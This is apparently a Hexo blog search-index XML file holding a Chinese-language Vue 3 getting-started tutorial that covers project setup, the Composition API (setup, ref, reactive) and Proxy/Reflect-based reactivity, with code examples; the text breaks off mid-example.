<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vue3</title>
      <link href="/2023/10/07/Vue3/"/>
      <url>/2023/10/07/Vue3/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue3快速上手"><a href="#Vue3快速上手" class="headerlink" title="Vue3快速上手"></a>Vue3快速上手</h1><h2 id="Vue3简介"><a href="#Vue3简介" class="headerlink" title="Vue3简介"></a>Vue3简介</h2><ul><li>2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）</li><li>耗时2年多、<a href="https://github.com/vuejs/vue-next/graphs/commit-activity">2600+次提交</a>、<a href="https://github.com/vuejs/rfcs/tree/master/active-rfcs">30+个RFC</a>、<a href="https://github.com/vuejs/vue-next/pulls?q=is:pr+is:merged+-author:app/dependabot-preview+">600+次PR</a>、<a href="https://github.com/vuejs/vue-next/graphs/contributors">99位贡献者</a></li><li>github上的tags地址：<a href="https://github.com/vuejs/vue-next/releases/tag/v3.0.0">https://github.com/vuejs/vue-next/releases/tag/v3.0.0</a></li></ul><h2 id="Vue3带来了什么"><a href="#Vue3带来了什么" class="headerlink" title="Vue3带来了什么"></a>Vue3带来了什么</h2><h3 id="性能的提升"><a href="#性能的提升" class="headerlink" title="性能的提升"></a>性能的提升</h3><ul><li><p>打包大小减少41%</p></li><li><p>初次渲染快55%, 更新渲染快133%</p></li><li><p>内存减少54%</p><p>……</p></li></ul><h3 id="源码的升级"><a href="#源码的升级" class="headerlink" title="源码的升级"></a>源码的升级</h3><ul><li><p>使用Proxy代替defineProperty实现响应式</p></li><li><p>重写虚拟DOM的实现和Tree-Shaking</p><p>……</p></li></ul><h3 id="拥抱TypeScript"><a href="#拥抱TypeScript" class="headerlink" title="拥抱TypeScript"></a>拥抱TypeScript</h3><ul><li>Vue3可以更好的支持TypeScript</li></ul><h3 id="新的特性"><a href="#新的特性" class="headerlink" title="新的特性"></a>新的特性</h3><ol><li><p>Composition API（组合API）</p><ul><li>setup配置</li><li>ref与reactive</li><li>watch与watchEffect</li><li>provide与inject</li><li>……</li></ul></li><li><p>新的内置组件</p><ul><li>Fragment</li><li>Teleport</li><li>Suspense</li></ul></li><li><p>其他改变</p><ul><li>新的生命周期钩子</li><li>data 选项应始终被声明为一个函数</li><li>移除keyCode支持作为 v-on 的修饰符</li><li>……</li></ul></li></ol><hr><h1 id="创建Vue3-0工程"><a href="#创建Vue3-0工程" class="headerlink" title="创建Vue3.0工程"></a>创建Vue3.0工程</h1><h2 id="使用-vue-cli-创建"><a href="#使用-vue-cli-创建" class="headerlink" title="使用 vue-cli 创建"></a>使用 vue-cli 创建</h2><p>官方文档：<a href="https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create">https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上</span></span><br><span class="line">vue --version</span><br><span class="line"><span class="comment">## 安装或者升级你的@vue/cli</span></span><br><span class="line">npm install -g @vue/cli</span><br><span class="line"><span class="comment">## 创建</span></span><br><span class="line">vue create vue_test</span><br><span class="line"><span class="comment">## 启动</span></span><br><span class="line"><span class="built_in">cd</span> vue_test</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure><h2 id="使用-vite-创建"><a href="#使用-vite-创建" class="headerlink" title="使用 vite 创建"></a>使用 vite 创建</h2><p>官方文档：<a href="https://v3.cn.vuejs.org/guide/installation.html#vite">https://v3.cn.vuejs.org/guide/installation.html#vite</a></p><p>vite官网：<a href="https://vitejs.cn/">https://vitejs.cn</a></p><ul><li>什么是vite？—— 新一代前端构建工具。</li><li>优势如下：<ul><li>开发环境中，无需打包操作，可快速的冷启动。</li><li>轻量快速的热重载（HMR）。</li><li>真正的按需编译，不再等待整个应用编译完成。</li></ul></li><li>webpack传统构建 与 vite构建对比图<br><img src="/images/%E4%BC%A0%E7%BB%9F%E6%9E%84%E5%BB%BA.webp" alt="Image text"><br><img src="/images/vite%E6%9E%84%E5%BB%BA.webp" alt="Image text"></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 创建工程</span></span><br><span class="line">npm init vite-app &lt;project-name&gt;</span><br><span class="line"><span class="comment">## 进入工程目录</span></span><br><span class="line"><span class="built_in">cd</span> &lt;project-name&gt;</span><br><span class="line"><span class="comment">## 安装依赖</span></span><br><span class="line">npm install</span><br><span class="line"><span class="comment">## 运行</span></span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><h2 id="分析工程结构"><a href="#分析工程结构" class="headerlink" title="分析工程结构"></a>分析工程结构</h2><ul><li>入口文件main.js的不同<h3 id="vue2"><a href="#vue2" class="headerlink" title="vue2"></a>vue2</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入vue构造函数</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 引入所有组件的外壳组件app(app是汇总所有的组件)</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="comment">// el: &#x27;#app&#x27;,</span></span><br><span class="line">    <span class="comment">// render: (h) =&gt; &#123; return h(App)&#125;</span></span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>) <span class="comment">// render函数（配置项）,vue会调用render函数并把h传进来，h叫渲染函数</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// #app 页面容器id</span></span><br><span class="line">vm.$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="vue3"><a href="#vue3" class="headerlink" title="vue3"></a>vue3</h3><ul><li>vue3组件中的模版结构可以没有根标签<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入一个名为createApp的工厂函数，可以直接调用</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建应用实例对象-app(类似于vue2中的vm，但app比vm更&quot;轻&quot;)</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="常用-Composition-API"><a href="#常用-Composition-API" class="headerlink" title="常用 Composition API"></a>常用 Composition API</h1><p>官方文档: <a href="https://v3.cn.vuejs.org/guide/composition-api-introduction.html">https://v3.cn.vuejs.org/guide/composition-api-introduction.html</a></p><h2 id="拉开序幕的setup"><a href="#拉开序幕的setup" class="headerlink" title="拉开序幕的setup"></a>拉开序幕的setup</h2><ol><li>理解：Vue3.0中一个新的配置项，值为一个函数(组合式API就是一堆内置的函数)。</li><li>setup是所有<strong style="color:#DD5145">Composition API（组合API）</strong><i style="color:gray;font-weight:bold">“ 表演的舞台 ”</i>。</li><li>组件中所用到的：数据、方法等等，均要配置在setup中。</li><li>setup函数的两种返回值：<ol><li>若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）</li><li><span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span></li></ol></li><li>setup比beforeCreate先执行</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> &#123;h&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span><br><span class="line">    <span class="comment">// 此处只是测试一下setup，暂时不考虑响应式的问题</span></span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> name = <span class="string">&#x27;张三&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="comment">// 模版字符串</span></span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">`我叫<span class="subst">$&#123;name&#125;</span>，我<span class="subst">$&#123;age&#125;</span>岁了，你好哇！`</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回对象</span></span><br><span class="line">    <span class="comment">// return &#123;</span></span><br><span class="line">    <span class="comment">//   name,</span></span><br><span class="line">    <span class="comment">//   age,</span></span><br><span class="line">    <span class="comment">//   sayHello</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">h</span>(<span class="string">&#x27;h1&#x27;</span>, <span class="string">&#x27;测试&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>注意点：<ol><li>尽量不要与Vue2.x配置混用<ul><li>Vue2.x配置（data、methos、computed…）中<strong style="color:#DD5145">可以访问到</strong>setup中的属性、方法。</li><li>但在setup中<strong style="color:#DD5145">不能访问到</strong>Vue2.x配置（data、methos、computed…）。</li><li>如果有重名, setup优先。</li></ul></li><li>setup不能是一个async函数，因为返回值不再是return的对象, 而是promise(包裹的对象), 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）</li></ol></li></ol><h2 id="ref函数"><a href="#ref函数" class="headerlink" title="ref函数"></a>ref函数</h2><ul><li><p>作用: 定义一个响应式的数据</p></li><li><p>语法: <code>const xxx = ref(initValue)</code></p><ul><li>创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>。</li><li>JS中操作数据： <code>xxx.value</code></li><li>模板中读取数据: 不需要.value，直接：<code>&lt;div&gt;&#123;&#123;xxx&#125;&#125;&lt;/div&gt;</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;ref&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span><br><span class="line">    <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> name = <span class="title function_">ref</span>(<span class="string">&#x27;张三&#x27;</span>) <span class="comment">// ref引用对象---&gt;引用实现对象RefImpl</span></span><br><span class="line">        <span class="keyword">let</span> age = <span class="title function_">ref</span>(<span class="number">18</span>);</span><br><span class="line">        <span class="keyword">let</span> job = <span class="title function_">ref</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;前端工程师&#x27;</span>,</span><br><span class="line">            <span class="attr">salary</span>: <span class="string">&#x27;30k&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方法</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">changeInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">            name.<span class="property">value</span> = <span class="string">&#x27;李四&#x27;</span>;</span><br><span class="line">            age.<span class="property">value</span> = <span class="number">20</span>;</span><br><span class="line">            job.<span class="property">value</span>.<span class="property">type</span> = <span class="string">&#x27;UI设计师&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            name,</span><br><span class="line">            age,</span><br><span class="line">            changeInfo</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/images/ref%E8%A7%A3%E6%9E%90%E5%9B%BE.png" alt="Image text"></li></ul></li><li><p>ref定义基础类型和对象类型解析<br><img src="/images/ref%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B%E5%92%8C%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B.png" alt="Image text"></p></li><li><p>备注：</p><ul><li>接收的数据可以是：基本类型、也可以是对象类型。</li><li>基本类型的数据：响应式依然是靠<code>Object.defineProperty()</code>的<code>get</code>与<code>set</code>完成的。</li><li>对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— <code>reactive</code>函数。<br><img src="/images/ref%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90.jpg" alt="Image text"></li></ul></li></ul><h2 id="reactive函数"><a href="#reactive函数" class="headerlink" title="reactive函数"></a>reactive函数</h2><ul><li>作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用<code>ref</code>函数）</li><li>语法：<code>const 代理对象= reactive(源对象)</code>接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong></li><li>reactive定义的响应式数据是“深层次的”。</li><li>内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reactive&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span><br><span class="line">    <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> job = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;前端工程师&#x27;</span>,</span><br><span class="line">            <span class="attr">salary</span>: <span class="string">&#x27;30k&#x27;</span>,</span><br><span class="line">            <span class="attr">a</span>: &#123;</span><br><span class="line">                <span class="attr">b</span>: &#123;</span><br><span class="line">                    <span class="attr">c</span>: <span class="number">666</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> hobby = [<span class="string">&#x27;抽烟&#x27;</span>, <span class="string">&#x27;喝酒&#x27;</span>, <span class="string">&#x27;烫头&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">            <span class="attr">job</span>: &#123;</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&#x27;前端工程师&#x27;</span>,</span><br><span class="line">                <span class="attr">salary</span>: <span class="string">&#x27;30k&#x27;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">hobby</span>: [<span class="string">&#x27;抽烟&#x27;</span>, <span class="string">&#x27;喝酒&#x27;</span>, <span class="string">&#x27;烫头&#x27;</span>]</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方法</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">changeInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">            job.<span class="property">type</span> = <span class="string">&#x27;UI设计师&#x27;</span>;</span><br><span class="line">            job.<span class="property">a</span>.<span class="property">b</span>.<span class="property">c</span> = <span class="number">999</span>;</span><br><span class="line">            hobby[<span class="number">0</span>] = <span class="string">&#x27;学习&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            job,</span><br><span class="line">            hobby,</span><br><span class="line">            person,</span><br><span class="line">            changeInfo</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/images/reactive%E8%A7%A3%E6%9E%90%E5%9B%BE.png" alt="Image text"><br><img src="/images/reactive%E5%87%BD%E6%95%B0.jpg" alt="Image text"></li></ul><h2 id="Vue3-0中的响应式原理"><a href="#Vue3-0中的响应式原理" class="headerlink" title="Vue3.0中的响应式原理"></a>Vue3.0中的响应式原理</h2><h3 id="vue2-x的响应式"><a href="#vue2-x的响应式" class="headerlink" title="vue2.x的响应式"></a>vue2.x的响应式</h3><ul><li><p>实现原理：</p><ul><li><p>对象类型：通过<code>Object.defineProperty()</code>对属性的读取、修改进行拦截（数据劫持）。</p></li><li><p>数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(data, <span class="string">&#x27;count&#x27;</span>, &#123;</span><br><span class="line">    get () &#123;&#125;, </span><br><span class="line">    set () &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>存在问题：</p><ul><li>对象新增属性、删除属性, 界面不会更新。(可以使用this.$set，Vue.set，this.$delete，Vue.delete实现)</li><li>数组直接通过下标修改数组, 界面不会自动更新。(可以使用this.$set，Vue.set，splice实现)</li></ul></li></ul><h3 id="Vue3-0的响应式"><a href="#Vue3-0的响应式" class="headerlink" title="Vue3.0的响应式"></a>Vue3.0的响应式</h3><ul><li><p>实现原理:</p><ul><li><p>通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="comment">// 源数据</span></span><br><span class="line">  <span class="keyword">let</span> person = &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据vue2中实现响应式</span></span><br><span class="line">  <span class="keyword">let</span> p = &#123;&#125;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(p, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">configurable</span>: <span class="literal">true</span>, <span class="comment">// 是否可以删除</span></span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>)&#123; <span class="comment">// 有人读取name时调用</span></span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`有人读取name属性`</span>)</span><br><span class="line">          <span class="keyword">return</span> person.<span class="property">name</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">value</span>)&#123; <span class="comment">// 有人修改name时调用</span></span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`有人修改了name属性，要去更新界面了！`</span>)</span><br><span class="line">          person.<span class="property">name</span> = value</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据vue3中实现响应式, Proxy叫代理</span></span><br><span class="line">  <span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Proxy</span>(person, &#123;</span><br><span class="line">      <span class="comment">// 有人读取p1的某个属性时调用</span></span><br><span class="line">      <span class="title function_">get</span>(<span class="params">target, propName</span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`有人读取了p1身上的<span class="subst">$&#123;propName&#125;</span>属性`</span>)</span><br><span class="line">          <span class="keyword">return</span> target[propName]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 有人修改p1的某个属性或给p1追加某个属性时调用</span></span><br><span class="line">      <span class="title function_">set</span>(<span class="params">target, propName, value</span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`有人修改了p1身上的<span class="subst">$&#123;propName&#125;</span>属性，要去更新界面了！`</span>)</span><br><span class="line">          target[propName] = value</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 有人删除p1的某个属性时调用</span></span><br><span class="line">      <span class="title function_">deleteProperty</span>(<span class="params">target, propName</span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`有人删除了p1身上的<span class="subst">$&#123;propName&#125;</span>属性，要去更新界面了！`</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">delete</span> target[propName]</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>通过Reflect（反射）:  对源对象的属性进行操作。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="comment">// 源数据</span></span><br><span class="line">  <span class="keyword">let</span> obj = &#123;</span><br><span class="line">      <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">b</span>: <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 通过Object.defineProperty操作</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 报错，Object.defineProperty不能同时定义相同的属性</span></span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&#x27;c&#x27;</span>, &#123;</span><br><span class="line">          <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&#x27;c&#x27;</span>, &#123;</span><br><span class="line">          <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 通过Reflect.defineProperty操作</span></span><br><span class="line">  <span class="keyword">const</span> x1 = <span class="title class_">Reflect</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&#x27;c&#x27;</span>, &#123;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// console.log(x1) ---&gt; true</span></span><br><span class="line">  <span class="keyword">const</span> x2 = <span class="title class_">Reflect</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&#x27;c&#x27;</span>, &#123;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// console.log(x2) ---&gt; false</span></span><br><span class="line">  <span class="keyword">if</span>(x2)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;成功&#x27;</span>)</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;失败&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>MDN文档中描述的Proxy与Reflect：</p><ul><li><p>Proxy：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy</a></p></li><li><p>Reflect：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect</a></p>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 源数据</span></span><br><span class="line"><span class="keyword">let</span> data = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(data, &#123;</span><br><span class="line">    <span class="comment">// 拦截读取属性值</span></span><br><span class="line">    get (target, propName) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, propName)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 拦截设置属性值或添加新属性</span></span><br><span class="line">    set (target, propName, value) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target, propName, value)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 拦截删除属性</span></span><br><span class="line">    deleteProperty (target, propName) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">deleteProperty</span>(target, propName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">          </span><br><span class="line">proxy.<span class="property">name</span> = <span class="string">&#x27;tom&#x27;</span>   </span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="reactive对比ref"><a href="#reactive对比ref" class="headerlink" title="reactive对比ref"></a>reactive对比ref</h2><ul><li>从定义数据角度对比：<ul><li> ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。</li><li> reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。</li><li> 备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过<code>reactive</code>转为<strong style="color:#DD5145">代理对象</strong>。</li></ul></li><li>从原理角度对比：<ul><li> ref通过<code>Object.defineProperty()</code>的<code>get</code>与<code>set</code>来实现响应式（数据劫持）。</li><li> reactive通过使用<strong style="color:#DD5145">ES6中的新构造函数Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。</li></ul></li><li>从使用角度对比：<ul><li> ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong><code>.value</code>，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong><code>.value</code>。</li><li> reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong><code>.value</code>。</li></ul></li></ul><h2 id="setup的两个注意点"><a href="#setup的两个注意点" class="headerlink" title="setup的两个注意点"></a>setup的两个注意点</h2><ul><li><p>vue2中VueComponent</p><ul><li>子组件props不接收时，VueComponent中$attrs中会存；如果接收，$attrs中不会存</li><li>VueComponent中$slots存储插槽内容</li><li>emit 触发自定义事件</li></ul></li><li><p>setup执行的时机</p><ul><li>在beforeCreate之前执行一次，this是undefined。</li></ul></li><li><p>setup的参数</p><ul><li>props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。</li><li>context：上下文对象<ul><li>attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于vue2中的 <code>this.$attrs</code>。</li><li>slots: 收到的插槽内容, 相当于vue2中的 <code>this.$slots</code>。</li><li>emit: 触发自定义事件的函数, 相当于vue2中的 <code>this.$emit</code>。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--------父组件---------&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Demo</span> @<span class="attr">hello</span>=<span class="string">&quot;showHelloMsg&quot;</span> <span class="attr">msg</span>=<span class="string">&quot;你好&quot;</span> <span class="attr">school</span>=<span class="string">&quot;学校&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:qwe</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>教室<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:qwe1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>教室<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Demo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Demo</span> <span class="keyword">from</span> <span 